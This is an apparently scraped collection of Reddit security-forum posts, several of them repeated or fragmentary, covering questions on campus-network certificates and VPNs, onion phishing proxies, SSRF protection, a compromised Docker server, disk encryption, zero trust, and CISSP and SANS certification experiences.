As I'm sure most of you all have noticed, posts are now going through instead of being held up in the mod queue like they were for months. This filter is still being monitored for rule-breaking posts, and other issues so do keep that in mind. Unfortunately, there were *thousands* of posts in the queue so to lessen our workload most were removed besides those of around 30\~ or fewer days old.

*Please report any issues with the filter in mod mail and we will work on fixing it asap.*

**Post Rules**

As a team, we have decided that this sub's focus will be more technical. That means that questions related to career advice, what cert to get, how to get started, etc, should be posted to places like: r/SecurityCareerAdvice, /r/NetSecStudents, /r/ITCareerQuestions, etc. We will be removing posts that violate this rule.

**Bans**

As every new administration does, we've looked through the bans and noticed many valid and invalid bans and will like to open the opportunity for all previously banned users to appeal via mod mail. These will be done case by case and may take a bit if there is a backlog.

&#x200B;

That's all for today folks, I hope you've all had a good weekend and I'll see you all again next month.",2021-08-16

When installing this certificate, I got a prompt from android that said “Note: The issuer of this certificate may inspect all traffic to and from the device.” Seeing as I don't necessarily want my university being able to monitor literally everything I do on my phone, I was wondering if a VPN would help secure my traffic with this.

I am not an expert in logging/IR/blue side, so please do share any guides or advice on this.

2281,pa80mi,Analyzing an onion phishing proxy....?,"So there are a bunch of subreddits with phishing links on the sidebar posing as darknet markets, scamming people daily. Reddit won't verify the real vs phishing links since they're onions even though I reported them months ago.

I've been using dev tools (f12) in the browser to look for differences between the real and phishing sites. 

I'm looking for any other tools that could scan or prove beyond a reasonable doubt that it's a proxy server, but the normal tools don't work on onion sites.

One of the key differences I've found is the network timings between phishing links and the official links. [Example](https://i.imgur.com/JpjAudH.jpg), seems pretty clear it's a proxy that does forward requests back and forth to the genuine site, but when you go to transfer crypto they intercept it or substitute their wallet address for the real one.

Normally people would pgp verify the site, however since the proxy does interact with the real site, it does have a valid pgp signature.

Another detail I've found that differs between the phishing and real site is the phishing site throws 2 warnings the real site doesn't:

>Some cookies are misusing the recommended ""samesite"" attribute.

The official mirrors list has 8 different URLs, every single one of them shows the same network timing without the proxy, while almost every link I've found on reddit have the phishing timings. (picture above).",2021-08-23

Are there any good supporting tools that can keep a dynamic inventory? 

I find it increasingly frustrating to not be able to answer security related questions because I don't know what the state of the system was at a given time in the past and often even in the present, as the information is spread over various systems ranging from MDM to patch management as well as endpoint protection.

2304,p3nl5z,"Use cases for policy based decryption, especially NBDE / clevis and tang","I am interested in the use cases for network bound disk encryption, especially in larger environments. I have setup NBDE with clevis and tang in 2 VMs with Ubuntu, and it works quite well. 

But how do larger organisations utilise PBD/NBDE? 

They can roll out NBDE to get some kind of transparent encryption where the end user does not have to interact with the encryption, since the machine boots up without the need to enter a password or put in a token/smart card. But against which threat does this defend? 

Full disk encryption is IMO mostly useful on mobile devices that can easily get lost or stolen or be tampered with in your hotel room while you are attending a conference dinner. So outside of your organisation's network NBDE doesn't make any sense except that you don't have to enter your password while in office and connected to the network with the tang server.

NBDE on machines that never leave the office building only makes sense to me as a tool to avoid annoying the users by not having them to enter a password. 

Servers/VMs can get FDE via LUKS and NBDE in a way such they also can reboot without any interaction. Which is nice, but the typical threat to servers isn't the adversary in the building who steals the drive from the 19"" rack. 

I have seen some slides from McCallum, where he suggest more sophisticated policy based models by combining multiple factors/techniques like tang/clevis and a yubikey token. But I haven't found examples of this in the wild yet. 

So what are usecases for larger organisations? How do they benefit from NBDE/PBD especially on end user machines like laptops?",2021-08-13

I've been aware of the idea of Zero Trust design and some basic concepts for a while now and have been hoping to nudge things at work closer to that philosophy.  Reflecting on what I'm reading has left me wondering something.

I've generally heard that we should use SSH keys instead of interactive passwords when connecting from one Unix-like system (e.g. Linux, FreeBSD, etc.) to another because it provides better protection.  However, as I understand the design, it assumes that the key files are not compromised.  In Zero Trust design, we assume that all hosts are compromised, though.

So how do we reconcile those two ideas?  Should I be using something besides SSH keys or passwords?  Is there something about the keys that I'm missing?  Is the Zero Trust design relying on centralized authentication, such as AD, LDAP, or Kerberos to make authentication automatic?

I feel like I'm missing something basic here.  Any help is appreciated.",2021-08-07

You send the passport and birth certificate as unencrypted email attachments.

The only thing I do on this website is upload my sleep data from my CPAP's SD card, read the results and then leave. I never sign in with my google account, or put any kind of sensitive data.

Considering my use case doesn't include inputting any sensitive data in the website, would I be safe proceeding to browse it? I figure that even with an unsecured connection, a hacker can't steal what I don't type.",2021-07-26

2360,op3w4b,GPEN or GWAPT? (I don't have to pay for either),"Hi. I was hoping to hear the community's thoughts about these certs. I am really torn over what I should take.   


I am not working full time in the industry yet, but I have an opportunity to take one of these courses for free to put it simply to help me jumpstart things. Regardless of what I pick, I intend to pursue a SANs cert.   


I am familiar with the SANs meta (the index) and I am really looking more towards understanding the differences between the two certs and how it impacts job prospects moreso than how to pass them.   


One of my concerns is I heard GPEN is very Windows heavy; with that said, I also heard the GPEN covers things such as lateral movement and post exploitation, which are things I would like to explore more. To those who have taken the GPEN, was the material taught applicable to other configurations (non-windows systems) once you have knowledge of the other technologies and the GPEN-taught methodologies available ?   


In terms of career prospects, I would like to work in DFIR, especially in mobile forensics. I am aware SANS has forensics-specific courses, but it is not available to me in this circumstance I am in where I can get a SANS cert for free. The catalog available for me to choose from has the GPEN and GWAPT standing out the most to me.   


Considering most mobile devices are attacked via applications, which are constantly connected to clouds and remote servers, I thought web app pen testing might be a good fit. Is the GWAPT very narrow in that respect? is there anything with respect to pivoting or post exploitation covered in that class, or is it merely attacks against public facing systems (and what can be gained at that point in a network)?   


Correct me if I am wrong, but my understanding of the two certs are as follows:  


GPEN: Recon -> Scanning -> exploitation -> post-exploitation  
but all done on Windows Systems  


GWAPT: Recon-> Scanning->exploitation  
but extensively covers a variety of web technologies.   


Long-term, I'd like to take the OSCP one day (just to say I have it) so it is on my radar but not for right now. I am aware it is an entirely different beast from GPEN.   


Another thing I've considered is take the GPEN to go through the entire pentesting methodology, then take something in my financial means like a elearn security cert to fill in the gaps in my web app understanding ( hear those certs are more hands on too).   


I have some work prospects in DFIR at the moment, but if I don't end up in DFIR, I see myself going into red teaming anyway; I like it. Does it make sense to go through the  whole pentesting process with GPEN then learn about web app security later even though web app tech is ""hot"" right now? I am also considering the industry's movement to the cloud and the reliance of web technologies further to deliver organizational needs. It's great to get something like a SANs cert for free and I don't want to blow it on something that isn't on HR's Radar or is less reputable than the other.  


 Does the GWAPT lock me out of more pentesting jobs compared to the GPEN?",2021-07-22
2361,op0a1s,[Question] Deploying smokescreen to prevent SSRF,"I've been experimenting with smokescreen to handle SSRF attacks on internal infrastructure. The thing is that the service I'm working with needs to communicate with some parts of the internal infrastructure for things like authentication. Smokescreen by default blocks all connections to RFC 1918 addresses. An idea I had was to create a whitelist for internal ip addresses but I can't help but wonder if that defeats the whole purpose of a SSRF protection proxy as there are still some internal traffic allowed.  


I'm wondering if in this case if my thinking is correct or if anyone has had experience deploying these SSRF proxies.

If this passes, the clients IP and OTP are temporarily added to their account row.  All requests for the set time to live must be from that IP and sending that OTP.

*Gateway authentication ensures users and services are authenticated  by gateways to reduce the likelihood of unauthorised access and provide  an auditing capability to support the investigation of cybersecurity  incidents.*

The question it asks is, *if an organisation must meet a control  ""Users and services accessing networks through gateways are authenticated"" is this fundamentally addressing Confidentiality,  Integrity, or Availability?*

My confusion is that - could it not be Confidentiality because (in my  view) the whole reason behind authenticating a User or Service is to  prevent unauthorised parties/services from traversing through the  Gateway?

2401,p5m81j,State of The Subreddit - #1 - 08/2021,"**Hello Everyone!**

We at r/AskNetsec would like to introduce you to our new ""Segment"" State Of the Sub, For the next few months, this will be released at the end of each month as a way of transparency between the mod team and you guys.

&#x200B;

**New Moderators**

In the wake of the old mods, Seven new moderators have been added to help around. They have individually been selected based on experience in the field and a few other selected qualities. They are subject to the same rules as the rest of you, so please feel free to report any all rule-breaking posts, even if it comes from a moderator. (Abuse will result in a perm ban)

**The** ***filter***

As I'm sure most of you all have noticed, posts are now going through instead of being held up in the mod queue like they were for months. This filter is still being monitored for rule-breaking posts, and other issues so do keep that in mind. Unfortunately, there were *thousands* of posts in the queue so to lessen our workload most were removed besides those of around 30\~ or fewer days old.

*Please report any issues with the filter in mod mail and we will work on fixing it asap.*

**Post Rules**

As a team, we have decided that this sub's focus will be more technical. That means that questions related to career advice, what cert to get, how to get started, etc, should be posted to places like: r/SecurityCareerAdvice, /r/NetSecStudents, /r/ITCareerQuestions, etc. We will be removing posts that violate this rule.

**Bans**

As every new administration does, we've looked through the bans and noticed many valid and invalid bans and will like to open the opportunity for all previously banned users to appeal via mod mail. These will be done case by case and may take a bit if there is a backlog.

&#x200B;

That's all for today folks, I hope you've all had a good weekend and I'll see you all again next month.",2021-08-16

2408,pa80mi,Analyzing an onion phishing proxy....?,"So there are a bunch of subreddits with phishing links on the sidebar posing as darknet markets, scamming people daily. Reddit won't verify the real vs phishing links since they're onions even though I reported them months ago.

I've been using dev tools (f12) in the browser to look for differences between the real and phishing sites. 

I'm looking for any other tools that could scan or prove beyond a reasonable doubt that it's a proxy server, but the normal tools don't work on onion sites.

One of the key differences I've found is the network timings between phishing links and the official links. [Example](https://i.imgur.com/JpjAudH.jpg), seems pretty clear it's a proxy that does forward requests back and forth to the genuine site, but when you go to transfer crypto they intercept it or substitute their wallet address for the real one.

Normally people would pgp verify the site, however since the proxy does interact with the real site, it does have a valid pgp signature.

Another detail I've found that differs between the phishing and real site is the phishing site throws 2 warnings the real site doesn't:

>Some cookies are misusing the recommended ""samesite"" attribute.

The official mirrors list has 8 different URLs, every single one of them shows the same network timing without the proxy, while almost every link I've found on reddit have the phishing timings. (picture above).",2021-08-23
2409,p9ymqg,"Will a VPN secure my traffic on my college's wifi network, which requires I install a certificate?","Hi,

I asked this on r/vpn but got kind of mixed answers, so thought I might ask here for potentially more expertise.

When installing this certificate, I got a prompt from android that said “Note: The issuer of this certificate may inspect all traffic to and from the device.” Seeing as I don't necessarily want my university being able to monitor literally everything I do on my phone, I was wondering if a VPN would help secure my traffic with this.

2430,p61mui,2 of my servers got hacked last night around the same time.,"2 of my servers that were running nginx and docker both got hacked by what looks like a worm of some sort about the same time.

OVH sent me an email.  I updated everything and restarted (hoping it was just a docker image that got hacked and not the root of server) and all the erroneous processes stopped but while I was sleeping the server got re-exploited and by morning my host had disabled them.

The only non-docker services I run on the servers are nginx & ssh.  I do have password auth enabled (yeah yeah I know) but I don't think both would have been bruteforced at the same time so this feels like an exploit of some sort.  Are there any major docker vulnerabilities that would allow this?

I have other servers that didn't get touched but they were setup more recently and have latest version of docker on them.

Both servers are now in recovery mode.  I am going to nuke from orbit as soon as I recover data but is there anything quick I should look at before hand to get a clue how they got in?

edit: I found a docker image common to both servers that had a default SSH password set from a well known project template.  When I logged into hacked server there were a ton of rsync processes and various nefarious processes running so first thing i did was stop the docker service to see if they stopped but they carried on with the docker service stopped.

2436,p5i0db,How to keep an accurate Endpoint inventory?,"Actively managing inventory seems very important to ensure other controls can be effective.

It also helps investigating security incidents by knowing which endpoints belong to a user, what IP address it has and what OS release version it is running.

Are there any good supporting tools that can keep a dynamic inventory? 

I find it increasingly frustrating to not be able to answer security related questions because I don't know what the state of the system was at a given time in the past and often even in the present, as the information is spread over various systems ranging from MDM to patch management as well as endpoint protection.

I can't believe this. In my eyes, this not only violates information security principles, but is certainly illegal. I can imagine that it is a violation of the GDPR as well.

2439,p4bjxm,What are some architectural solutions for logging and collecting data sources via Cloud?,"I want to collect and log all of the data sources from our workstation (macs so unified logs), servers (e.g. firewall logs, web logs, etc.) and cloud environment (AWS logs, Google Workspace audit logs, etc.). Due to the way we work, we do not have an internal infrastructure (AD) per se, we manage the workstation for JAMF and zero trust models. But that's another story. We use the Hive and ELK.

I am not an expert in logging/IR/blue side, so please do share any guides or advice on this. But I believe, these logs need to pass to a storage, so into an S3 bucket and we can get our SIEM to read it from there. We plan to auto archive 6 months logs to glacier for compliance reasons. I see that [runpanther.io](https://runpanther.io) mentioned the use of SQS/SNS/Firehose for this but am struggling to combine these technologies together. 

1. Could someone share insight about this part and if it's better/cost-effective.

2443,p3nl5z,"Use cases for policy based decryption, especially NBDE / clevis and tang","I am interested in the use cases for network bound disk encryption, especially in larger environments. I have setup NBDE with clevis and tang in 2 VMs with Ubuntu, and it works quite well. 

But how do larger organisations utilise PBD/NBDE? 

They can roll out NBDE to get some kind of transparent encryption where the end user does not have to interact with the encryption, since the machine boots up without the need to enter a password or put in a token/smart card. But against which threat does this defend? 

Full disk encryption is IMO mostly useful on mobile devices that can easily get lost or stolen or be tampered with in your hotel room while you are attending a conference dinner. So outside of your organisation's network NBDE doesn't make any sense except that you don't have to enter your password while in office and connected to the network with the tang server.

NBDE on machines that never leave the office building only makes sense to me as a tool to avoid annoying the users by not having them to enter a password. 

Servers/VMs can get FDE via LUKS and NBDE in a way such they also can reboot without any interaction. Which is nice, but the typical threat to servers isn't the adversary in the building who steals the drive from the 19"" rack. 

I have seen some slides from McCallum, where he suggest more sophisticated policy based models by combining multiple factors/techniques like tang/clevis and a yubikey token. But I haven't found examples of this in the wild yet. 

So what are usecases for larger organisations? How do they benefit from NBDE/PBD especially on end user machines like laptops?",2021-08-13

I've generally heard that we should use SSH keys instead of interactive passwords when connecting from one Unix-like system (e.g. Linux, FreeBSD, etc.) to another because it provides better protection.  However, as I understand the design, it assumes that the key files are not compromised.  In Zero Trust design, we assume that all hosts are compromised, though.

So how do we reconcile those two ideas?  Should I be using something besides SSH keys or passwords?  Is there something about the keys that I'm missing?  Is the Zero Trust design relying on centralized authentication, such as AD, LDAP, or Kerberos to make authentication automatic?

My plan is to build our security infrastructure in layers to better address a lot of the attacks that seem to be taking down even large corporations and infrastructure providers.

One decision I am stuck on that I would really appreciate input and guidance on is whether to go with applocker/ Device Guard with Windows 10 Enterprise LTSC or to go with Threatlocker which does seem like a well thought out product that also includes elevation control and ringfencing along with application control. It would more than double the cost per endpoint when combined with SentinelOne though which makes me hesitant. We already need to purchase LTSC for our frontline worker stations so that is a significant yearly added expense.

I know that FortiAnalyzer is not really a proper SIEM tool, but it fits within our budget and seems like a pretty good product and is way more affordable than FortiSIEM.

Overall, does it seem like I'm heading in the right direction or are there other things I should be considering?

**User Training and Awareness Testing:** KnowBe4 Diamond with PhishER

2507,op3w4b,GPEN or GWAPT? (I don't have to pay for either),"Hi. I was hoping to hear the community's thoughts about these certs. I am really torn over what I should take.   


I am not working full time in the industry yet, but I have an opportunity to take one of these courses for free to put it simply to help me jumpstart things. Regardless of what I pick, I intend to pursue a SANs cert.   


I am familiar with the SANs meta (the index) and I am really looking more towards understanding the differences between the two certs and how it impacts job prospects moreso than how to pass them.   


One of my concerns is I heard GPEN is very Windows heavy; with that said, I also heard the GPEN covers things such as lateral movement and post exploitation, which are things I would like to explore more. To those who have taken the GPEN, was the material taught applicable to other configurations (non-windows systems) once you have knowledge of the other technologies and the GPEN-taught methodologies available ?   


In terms of career prospects, I would like to work in DFIR, especially in mobile forensics. I am aware SANS has forensics-specific courses, but it is not available to me in this circumstance I am in where I can get a SANS cert for free. The catalog available for me to choose from has the GPEN and GWAPT standing out the most to me.   


Considering most mobile devices are attacked via applications, which are constantly connected to clouds and remote servers, I thought web app pen testing might be a good fit. Is the GWAPT very narrow in that respect? is there anything with respect to pivoting or post exploitation covered in that class, or is it merely attacks against public facing systems (and what can be gained at that point in a network)?   


Correct me if I am wrong, but my understanding of the two certs are as follows:  


GPEN: Recon -> Scanning -> exploitation -> post-exploitation  
but all done on Windows Systems  


GWAPT: Recon-> Scanning->exploitation  
but extensively covers a variety of web technologies.   


Long-term, I'd like to take the OSCP one day (just to say I have it) so it is on my radar but not for right now. I am aware it is an entirely different beast from GPEN.   


Another thing I've considered is take the GPEN to go through the entire pentesting methodology, then take something in my financial means like a elearn security cert to fill in the gaps in my web app understanding ( hear those certs are more hands on too).   


I have some work prospects in DFIR at the moment, but if I don't end up in DFIR, I see myself going into red teaming anyway; I like it. Does it make sense to go through the  whole pentesting process with GPEN then learn about web app security later even though web app tech is ""hot"" right now? I am also considering the industry's movement to the cloud and the reliance of web technologies further to deliver organizational needs. It's great to get something like a SANs cert for free and I don't want to blow it on something that isn't on HR's Radar or is less reputable than the other.  


 Does the GWAPT lock me out of more pentesting jobs compared to the GPEN?",2021-07-22
2508,op0a1s,[Question] Deploying smokescreen to prevent SSRF,"I've been experimenting with smokescreen to handle SSRF attacks on internal infrastructure.

2529,pa80mi,Analyzing an onion phishing proxy....?,"So there are a bunch of subreddits with phishing links on the sidebar posing as darknet markets, scamming people daily. Reddit won't verify the real vs phishing links since they're onions even though I reported them months ago.

I've been using dev tools (f12) in the browser to look for differences between the real and phishing sites. 

I'm looking for any other tools that could scan or prove beyond a reasonable doubt that it's a proxy server, but the normal tools don't work on onion sites.

One of the key differences I've found is the network timings between phishing links and the official links. [Example](https://i.imgur.com/JpjAudH.jpg), seems pretty clear it's a proxy that does forward requests back and forth to the genuine site, but when you go to transfer crypto they intercept it or substitute their wallet address for the real one.

Normally people would pgp verify the site, however since the proxy does interact with the real site, it does have a valid pgp signature.

Another detail I've found that differs between the phishing and real site is the phishing site throws 2 warnings the real site doesn't:

>Some cookies are misusing the recommended ""samesite"" attribute.

The official mirrors list has 8 different URLs, every single one of them shows the same network timing without the proxy, while almost every link I've found on reddit have the phishing timings. (picture above).",2021-08-23

OVH sent me an email.  I updated everything and restarted (hoping it was just a docker image that got hacked and not the root of server) and all the erroneous processes stopped but while I was sleeping the server got re-exploited and by morning my host had disabled them.

The only non-docker services I run on the servers are nginx & ssh.  I do have password auth enabled (yeah yeah I know) but I don't think both would have been bruteforced at the same time so this feels like an exploit of some sort.  Are there any major docker vulnerabilities that would allow this?

I have other servers that didn't get touched but they were setup more recently and have latest version of docker on them.

Both servers are now in recovery mode.  I am going to nuke from orbit as soon as I recover data but is there anything quick I should look at before hand to get a clue how they got in?

**New Moderators**

In the wake of the old mods, Seven new moderators have been added to help around. They have individually been selected based on experience in the field and a few other selected qualities. They are subject to the same rules as the rest of you, so please feel free to report any all rule-breaking posts, even if it comes from a moderator. (Abuse will result in a perm ban)

**The** ***filter***

As I'm sure most of you all have noticed, posts are now going through instead of being held up in the mod queue like they were for months. This filter is still being monitored for rule-breaking posts, and other issues so do keep that in mind. Unfortunately, there were *thousands* of posts in the queue so to lessen our workload most were removed besides those of around 30\~ or fewer days old.

*Please report any issues with the filter in mod mail and we will work on fixing it asap.*

**Post Rules**

As a team, we have decided that this sub's focus will be more technical. That means that questions related to career advice, what cert to get, how to get started, etc, should be posted to places like: r/SecurityCareerAdvice, /r/NetSecStudents, /r/ITCareerQuestions, etc. We will be removing posts that violate this rule.

**Bans**

As every new administration does, we've looked through the bans and noticed many valid and invalid bans and will like to open the opportunity for all previously banned users to appeal via mod mail. These will be done case by case and may take a bit if there is a backlog.

But how do larger organisations utilise PBD/NBDE? 

They can roll out NBDE to get some kind of transparent encryption where the end user does not have to interact with the encryption, since the machine boots up without the need to enter a password or put in a token/smart card. But against which threat does this defend? 

Full disk encryption is IMO mostly useful on mobile devices that can easily get lost or stolen or be tampered with in your hotel room while you are attending a conference dinner. So outside of your organisation's network NBDE doesn't make any sense except that you don't have to enter your password while in office and connected to the network with the tang server.

NBDE on machines that never leave the office building only makes sense to me as a tool to avoid annoying the users by not having them to enter a password. 

Servers/VMs can get FDE via LUKS and NBDE in a way such they also can reboot without any interaction. Which is nice, but the typical threat to servers isn't the adversary in the building who steals the drive from the 19"" rack. 

I have seen some slides from McCallum, where he suggest more sophisticated policy based models by combining multiple factors/techniques like tang/clevis and a yubikey token. But I haven't found examples of this in the wild yet.

I've been aware of the idea of Zero Trust design and some basic concepts for a while now and have been hoping to nudge things at work closer to that philosophy.  Reflecting on what I'm reading has left me wondering something.

I've generally heard that we should use SSH keys instead of interactive passwords when connecting from one Unix-like system (e.g. Linux, FreeBSD, etc.) to another because it provides better protection.  However, as I understand the design, it assumes that the key files are not compromised.  In Zero Trust design, we assume that all hosts are compromised, though.

So how do we reconcile those two ideas?  Should I be using something besides SSH keys or passwords?  Is there something about the keys that I'm missing?  Is the Zero Trust design relying on centralized authentication, such as AD, LDAP, or Kerberos to make authentication automatic?

My plan is to build our security infrastructure in layers to better address a lot of the attacks that seem to be taking down even large corporations and infrastructure providers.

One decision I am stuck on that I would really appreciate input and guidance on is whether to go with applocker/ Device Guard with Windows 10 Enterprise LTSC or to go with Threatlocker which does seem like a well thought out product that also includes elevation control and ringfencing along with application control. It would more than double the cost per endpoint when combined with SentinelOne though which makes me hesitant. We already need to purchase LTSC for our frontline worker stations so that is a significant yearly added expense.

I know that FortiAnalyzer is not really a proper SIEM tool, but it fits within our budget and seems like a pretty good product and is way more affordable than FortiSIEM.

Overall, does it seem like I'm heading in the right direction or are there other things I should be considering?

**Windows Authentication (Multifactor):** PIV Compatible Smart Cards Using ADCS

**User Training and Awareness Testing:** KnowBe4 Diamond with PhishER

**Endpoint Protection and EDR:** SentinelOne Singularity Complete

**MDM/ RMM:** Intune with PowerBI and Possibly TacticalRMM over VPN

**Remote Access:** Connectwise Control and Mesh Central with VPN Tunnels

**Firewall:** Fortigate with UTP Bundle

2629,op3w4b,GPEN or GWAPT? (I don't have to pay for either),"Hi. I was hoping to hear the community's thoughts about these certs. I am really torn over what I should take.   


I am not working full time in the industry yet, but I have an opportunity to take one of these courses for free to put it simply to help me jumpstart things. Regardless of what I pick, I intend to pursue a SANs cert.   


I am familiar with the SANs meta (the index) and I am really looking more towards understanding the differences between the two certs and how it impacts job prospects moreso than how to pass them.   


One of my concerns is I heard GPEN is very Windows heavy; with that said, I also heard the GPEN covers things such as lateral movement and post exploitation, which are things I would like to explore more. To those who have taken the GPEN, was the material taught applicable to other configurations (non-windows systems) once you have knowledge of the other technologies and the GPEN-taught methodologies available ?   


In terms of career prospects, I would like to work in DFIR, especially in mobile forensics. I am aware SANS has forensics-specific courses, but it is not available to me in this circumstance I am in where I can get a SANS cert for free. The catalog available for me to choose from has the GPEN and GWAPT standing out the most to me.   


Considering most mobile devices are attacked via applications, which are constantly connected to clouds and remote servers, I thought web app pen testing might be a good fit. Is the GWAPT very narrow in that respect? is there anything with respect to pivoting or post exploitation covered in that class, or is it merely attacks against public facing systems (and what can be gained at that point in a network)?   


Correct me if I am wrong, but my understanding of the two certs are as follows:  


GPEN: Recon -> Scanning -> exploitation -> post-exploitation  
but all done on Windows Systems  


GWAPT: Recon-> Scanning->exploitation  
but extensively covers a variety of web technologies.   


Long-term, I'd like to take the OSCP one day (just to say I have it) so it is on my radar but not for right now. I am aware it is an entirely different beast from GPEN.   


Another thing I've considered is take the GPEN to go through the entire pentesting methodology, then take something in my financial means like a elearn security cert to fill in the gaps in my web app understanding ( hear those certs are more hands on too).   


I have some work prospects in DFIR at the moment, but if I don't end up in DFIR, I see myself going into red teaming anyway; I like it. Does it make sense to go through the  whole pentesting process with GPEN then learn about web app security later even though web app tech is ""hot"" right now? I am also considering the industry's movement to the cloud and the reliance of web technologies further to deliver organizational needs. It's great to get something like a SANs cert for free and I don't want to blow it on something that isn't on HR's Radar or is less reputable than the other.  


 Does the GWAPT lock me out of more pentesting jobs compared to the GPEN?",2021-07-22
2630,op0a1s,[Question] Deploying smokescreen to prevent SSRF,"I've been experimenting with smokescreen to handle SSRF attacks on internal infrastructure. The thing is that the service I'm working with needs to communicate with some parts of the internal infrastructure for things like authentication. Smokescreen by default blocks all connections to RFC 1918 addresses. An idea I had was to create a whitelist for internal ip addresses but I can't help but wonder if that defeats the whole purpose of a SSRF protection proxy as there are still some internal traffic allowed.

*Gateway authentication ensures users and services are authenticated  by gateways to reduce the likelihood of unauthorised access and provide  an auditing capability to support the investigation of cybersecurity  incidents.*

The question it asks is, *if an organisation must meet a control  ""Users and services accessing networks through gateways are authenticated"" is this fundamentally addressing Confidentiality,  Integrity, or Availability?*

My confusion is that - could it not be Confidentiality because (in my  view) the whole reason behind authenticating a User or Service is to  prevent unauthorised parties/services from traversing through the  Gateway?

**Explanation** :- so I'm going to create a python application which is going to run on top of the linux server and intercept all incoming http request and grab the source IP address and make an API call to detect whether the IP address is Proxy(ed) or V.P.N(ed) if it is there then my application simply drop that request/packet and if it is not then it'll pass that packet, It is all going to work in real time.

I was able to make a packet sniffer from where i can grab the  source IP address but i get confused that how can i hold that packet until my application make API Call and make a decision to proceed further or drop it 

I'm looking for any library, utility, advice or anything which is going to help me accomplish this task 

Any help/advice would be really appreciated. Thanks in advance.

2659,obiuf7,question about TLS with multi services,"hello everyone,

Please, I have an urgent question about TLS

I work in a company where we are selling a server with our own proprietary solution on it. this server have HTTP/HTTPS, SMTP, SIP/RTP, etc.

Now I have a customer who's complaining about the TLS 1.0 using the SMTP server, but I after I looked internally I've seen that they added TLS version 1.1 and 1.2,

So my question is, Does the TLS versions apply to all services in this server, or is it related to each one separately ?

Can I be sure that the fix I say apply to my case too.",2021-07-01

2662,p2hakt,Goodbye CISSP it was fun while it lasted.,"Just wanted to say goodbye to the CISSP community. After 25 years in IT and security I bought a gym and left the industry. I kept my CISSP for the last couple of years but it looks like I am done with IT for good. Got an email this morning saying my membership has been suspended for non payment and although a little sad at least I am not working for anyone else and my gym has the best surveillance system in the world :)Good luck to you all I have met many great people through the industry and it is well worth doing the CISSP if you want people to take you seriously.

Edit: Thank you all for the kind comments. I was finally able to make the one thing that kept me sane into a full time career. As an aside if I did have one piece of advice it would be to have something in your life that is completely different from IT in order to give you a different perspective on an ongoing basis. Good luck to you all.",2021-08-11
2663,of0f0r,Passed today. Everything they say is true...,"I passed today with 100 questions in about 80 minutes. All of my questions were from left field. It's like the test writers said ""okay, you read the Sybex Guide? Good, so you know the terminology. But since you have 5+ years of security experience, you should know how to solve this hypothetical problem that's tangentially based on the this risk management principle..."" 

It's like it doesn't test you on your knowledge of the material, but rather on your ability to internalize a and articulate the principles in scenarios you've never contemplated. 

Or what's more -- it's like you're going to an oracle and telling her you're worthy of CISSP. You act like you're worthy, but the whole time, deep down, you question if you're really worthy (i.e. you expect to see FAIL at the end). In then end the oracle is never wrong. Now I just have to wait until my psychometric evaluation is complete to see if I can get past my provisional pass. Hopefully I'm worthy. 

Study materials (in no order):

1) Sybex book

2) Mike Chapple LinkedIn Learning (All Domains)

3) Thor Teaches (Domain 1 and 2)

4) Wiley Sybex App quizzes

5) Self-paced Online course from uCertify (paid for by my employer). This has quizzes and labs. 

It's hard to say which one was the best. But the uCertify course was long and I has to finish it all to get a test voucher, so it certainly had the biggest impact on me. 

Good luck to you all!",2021-07-06
2664,p1at9r,Passed CISSP exam first try with ~5 months of study,"Hey everybody,

So I've been holding off to make this post until I had received my [official pass results](https://imgur.com/bkZZkEx) and sent in my application for endorsement.  Since I sent off my application the other day, I figured it was time to share my story.  This is going to be a long one, so I'll break it up into sections so you can read what you want.

    My Exam Experience

I wanted to start with this section as I feel it's the most important.  I took my exam at a professional Pearson testing center, about 2 hours away from my home.  My exam was on a Thursday, so I took that week off of work and reviewed every day from the moment I got up to the moment I went to bed.  I would wake up, chug some coffee, get to work, and sip on GFUEL all day to keep focused.  The day of my exam, I slept in, went for a walk, went out to IHOP for breakfast, and then drove to the testing center where I was an hour early so I could find the room where the exam was and then review in my car for a bit.  Going into the exam, I did not feel prepared, or that I knew all the information needed... but I have a rule about sticking to my exam date otherwise I'll keep pushing it back.  I figured if nothing else, I was about to take a REALLY good (and expensive) practice exam.  I honestly could have probably used another month of study to feel more comfortable.

I read some study that people who take adaptive exams generally score higher if they take their time on their first 10 or so questions, so I did that.  My overall strategy was that I would plan for like 110 questions, and then probably fail.  But I wanted to take my time and thoroughly read each question.  I figured my chances of actually going up to 150 were slim.  After the first 20 or so questions, I felt like the exam was focusing on all those little protocols, frameworks, and acronyms that you generally see once in your studies and brush off as not important.  It really drilled down on topics I didn't spend a lot of time on.  I received multiple questions about SOC, and honestly I could not recall the differences at all.  Pretty sure it kept asking them because I kept getting it wrong (be sure that when it was all over, I went and studied SOC).  After about 60 questions, I felt exhausted.  I felt like most of stuff that I studied and focused on memorizing didn't show up at all.  I stressed over memorizing Common Criteria tiers just before going in... not a single question about it.  Memorized SDLC and RMF... nothing about those.  I don't want to go into further detail due to NDA, but yeah.  Overall, around question 80, I was actually getting kind of mad lol.  I felt like 80% of my questions were ""what should you do if this happens"" or ""where would you find this listed"" types of things.  Overall it seems to be less about knowledge you've studied, and more what is best for this certain situation.

I focused hard until I got up to question 100, and before I clicked the button to submit my answer, I prepared myself to have either terribly failed, or totally passed.  I didn't know which.  It seemed like either my overall train of thought was going to be correct, or it wasn't.  After question 100, I had about 40 minutes left.  I kept slogging through each additional question, expecting the exam to end.  I ended up going all the way to 150 questions and ended with just seconds to spare.  I really had to kick up my speed after the initial 100, and I did NOT expect to go to 150, and had planned my slow reading strategy based on that... oh well!  I was exhausted when the exam was over.  I took my folded printout, went to the bathroom, then got in the elevator down to the parking garage.  I opened the printout in the elevator, and saw ""Congratulations!"" on the first line.  I let out the biggest and loudest cheer in my life.  I then had to sit in my car for 20 minutes before driving home just to relax and recover from the exam.

I'd love to be able to tell you ""study this"" and ""don't study this"", but honestly from all my time on here and asking others who have taken the test, it's impossible to say what's important and what's not.  Things I was told were super important didn't show up at all, and things I was told not to focus on popped up several times.  For the first day after I passed my exam, I was actually a bit angry because I felt like I spent so many nights focusing on learning material that didn't show up at all on the exam... but I realized that they can only quiz you on so many topics with such few questions.  So I must have shown early on that I knew certain related things, and diving deeper would be pointless.

    My Previous Experience

I have my Bachelor of Science in Computer Information Technology, but I wouldn't say this was much help aside from test-taking experience/strategy.  I achieved my CCNA last year, which made Domain 4 a breeze.  I got my Security+ in January, which I think was a good stepping stone into CISSP as it covered a lot of initial topics... Basically everything you learn in Sec+ is utilized in CISSP, so I don't see a downside to taking it first.  In February and March I took the AZ-900 and AI-900 exams since I got free vouchers from Microsoft's cloud skills challenges, so that helped me introduction to cloud topics (which is about as deep as CISSP goes).

